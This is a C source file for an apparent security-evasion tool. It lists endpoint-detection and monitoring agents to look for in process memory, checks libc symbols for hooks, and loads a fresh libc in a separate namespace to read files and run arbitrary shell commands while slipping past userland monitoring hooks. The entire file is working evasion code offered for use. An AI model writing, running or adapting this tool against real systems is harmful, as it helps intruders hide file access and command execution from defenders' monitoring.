#define _GNU_SOURCE
#include <dlfcn.h>
#include <link.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>

typedef int     (*fn_open)(const char *, int, ...);
typedef ssize_t (*fn_read)(int, void *, size_t);
typedef int     (*fn_close)(int);
typedef FILE   *(*fn_fopen)(const char *, const char *);
typedef int     (*fn_fclose)(FILE *);

static const char *edr_libs[] = {
    "edr_sensor", "edr_alpha", "edr_delta", "edr_agentd",
    "edr_endpoint_t", "tetragon", "falco", "wazuh",
    "edr_iota", "edr_iotav", "edr_khook_i", "edr_sys_ext",
    NULL
};

static void scan_maps(void)
{
    FILE *f = fopen("/proc/self/maps", "r");
    if (!f) { perror("/proc/self/maps"); return; }

    printf("[*] suspicious libraries in /proc/self/maps:\n");
    int found = 0;
    char line[512];
    while (fgets(line, sizeof(line), f)) {
        for (int i = 0; edr_libs[i]; i++) {
            if (strstr(line, edr_libs[i])) {
                printf("  [!] %s", line);
                found++;
                break;
            }
        }
    }
    fclose(f);
    if (!found) printf("  (none detected)\n");
}

static void compare_syms(void)
{
    const char *syms[] = {
        "open", "openat", "read", "write", "connect",
        "execve", "fork", "socket", "recvmsg", "sendmsg",
        NULL
    };

    void *fresh = dlmopen(LM_ID_NEWLM, "libc.so.6", RTLD_NOW | RTLD_LOCAL);
    if (!fresh) { fprintf(stderr, "[!] dlmopen: %s\n", dlerror()); return; }

    struct link_map *proc_lm = NULL, *fresh_lm = NULL;

    void *proc_libc = dlopen("libc.so.6", RTLD_NOW | RTLD_NOLOAD);
    if (proc_libc) {
        dlinfo(proc_libc, RTLD_DI_LINKMAP, &proc_lm);
        dlclose(proc_libc);
    }
    dlinfo(fresh, RTLD_DI_LINKMAP, &fresh_lm);

    uintptr_t proc_base  = proc_lm  ? (uintptr_t)proc_lm->l_addr  : 0;
    uintptr_t fresh_base = fresh_lm ? (uintptr_t)fresh_lm->l_addr : 0;

    printf("\n[*] symbol offset comparison (process vs fresh libc):\n");
    if (!proc_base || !fresh_base)
        printf("  [!] could not resolve libc base(s); falling back to raw pointer compare\n");
    printf("  %-12s  %-12s  %-12s  %s\n",
           "sym", "proc_off", "fresh_off", "status");

    int hooked = 0;
    for (int i = 0; syms[i]; i++) {
        void *proc_ptr  = dlsym(RTLD_DEFAULT, syms[i]);
        void *fresh_ptr = dlsym(fresh,         syms[i]);

        if (!proc_ptr || !fresh_ptr) continue;

        uintptr_t proc_off  = proc_base  ? (uintptr_t)proc_ptr  - proc_base  : 0;
        uintptr_t fresh_off = fresh_base ? (uintptr_t)fresh_ptr - fresh_base : 0;

        int diff = proc_base && fresh_base && (proc_off != fresh_off);
        if (diff) hooked++;

        printf("  %-12s  0x%-10lx  0x%-10lx  %s\n",
               syms[i],
               (unsigned long)proc_off,
               (unsigned long)fresh_off,
               diff ? "[HOOK DETECTED]" : "clean");
    }

    dlclose(fresh);
    printf("\n[*] %d hooked symbols\n", hooked);
}

static void read_clean(const char *path)
{
    void *fresh = dlmopen(LM_ID_NEWLM, "libc.so.6", RTLD_NOW | RTLD_LOCAL);
    if (!fresh) { fprintf(stderr, "[!] dlmopen: %s\n", dlerror()); return; }

    fn_open  p_open  = (fn_open) dlsym(fresh, "open");
    fn_read  p_read  = (fn_read) dlsym(fresh, "read");
    fn_close p_close = (fn_close)dlsym(fresh, "close");

    if (!p_open || !p_read || !p_close) {
        fprintf(stderr, "[!] dlsym: %s\n", dlerror());
        dlclose(fresh);
        return;
    }

    printf("[*] opening '%s' via fresh libc (bypasses PLT hooks on open/read)\n", path);

    int fd = p_open(path, O_RDONLY);
    if (fd < 0) {
        fprintf(stderr, "[-] open failed: %s\n", strerror(errno));
        dlclose(fresh);
        return;
    }

    char buf[8192];
    ssize_t n;
    while ((n = p_read(fd, buf, sizeof(buf))) > 0)
        fwrite(buf, 1, (size_t)n, stdout);

    p_close(fd);
    dlclose(fresh);
}

static void exec_clean(char *const argv[])
{
    void *fresh = dlmopen(LM_ID_NEWLM, "libc.so.6", RTLD_NOW | RTLD_LOCAL);
    if (!fresh) { fprintf(stderr, "[!] dlmopen: %s\n", dlerror()); return; }

    fn_fopen  p_fopen  = (fn_fopen) dlsym(fresh, "popen");
    fn_fclose p_fclose = (fn_fclose)dlsym(fresh, "pclose");

    if (!p_fopen || !p_fclose) {
        fprintf(stderr, "[!] dlsym: %s\n", dlerror());
        dlclose(fresh);
        return;
    }

    char cmd[4096] = {};
    for (int i = 0; argv[i]; i++) {
        if (i > 0) strncat(cmd, " ", sizeof(cmd) - strlen(cmd) - 1);
        strncat(cmd, argv[i], sizeof(cmd) - strlen(cmd) - 1);
    }

    printf("[*] exec via fresh libc popen: %s\n", cmd);

    FILE *f = p_fopen(cmd, "r");
    if (!f) { fprintf(stderr, "[-] popen failed\n"); dlclose(fresh); return; }

    char buf[4096];
    size_t r;
    while ((r = fread(buf, 1, sizeof(buf), f)) > 0)
        fwrite(buf, 1, r, stdout);

    p_fclose(f);
    dlclose(fresh);
}

int main(int argc, char *argv[])
{
    if (argc < 2) {
        fprintf(stderr, "usage: %s <detect|read|exec>\n", argv[0]);
        return 1;
    }

    if (strcmp(argv[1], "detect") == 0) {
        scan_maps();
        compare_syms();

    } else if (strcmp(argv[1], "read") == 0 && argc >= 3) {
        read_clean(argv[2]);

    } else if (strcmp(argv[1], "exec") == 0 && argc >= 3) {
        exec_clean(argv + 2);

    } else {
        fprintf(stderr, "unknown command: %s\n", argv[1]);
        return 1;
    }

    return 0;
}
